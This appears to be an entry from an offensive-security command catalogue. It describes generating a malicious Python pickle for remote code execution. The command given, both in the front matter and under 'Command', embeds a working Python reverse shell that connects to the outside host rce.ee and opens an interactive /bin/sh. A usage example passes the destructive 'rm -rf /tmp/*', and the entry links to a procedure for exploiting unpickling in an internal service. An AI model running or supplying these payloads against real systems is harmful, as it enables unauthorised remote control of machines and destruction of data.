---
data: >-
  python pickle_exploit.py "python -c 'import
  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"rce.ee\",443));os.dup2(s.fileno(),0);
  os.dup2(s.fileno(),1);
  os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
tags:
  - python
  - pickle
  - rce
type: command
output: Base64 string of pickled object for embedding in XXE
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:50.005Z'
id: 6ed0c62a-830e-4fb5-ade8-c8501618b137
verified: false
validated: true
submitted: true
---
# generate-python-malicious-pickle-for-rce

## Command

```bash
python pickle_exploit.py "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"rce.ee\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
```

## Description

Runs a Python script to create a base64-encoded malicious pickle using __reduce__ to execute os.system with a reverse shell command.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| sys.argv[1] | Custom command; defaults to reverse shell | No |

## Examples

### Basic Usage

```bash
python pickle_exploit.py
```

### Advanced Usage

```bash
python pickle_exploit.py "rm -rf /tmp/*"
```

## Expected Output

Base64 like YTB4OnsiX3JlZHVjZV9fIjo... for embedding.

## Related

- [[Related Procedure: Exploit-Python-Unpickling-in-Internal-Service]]
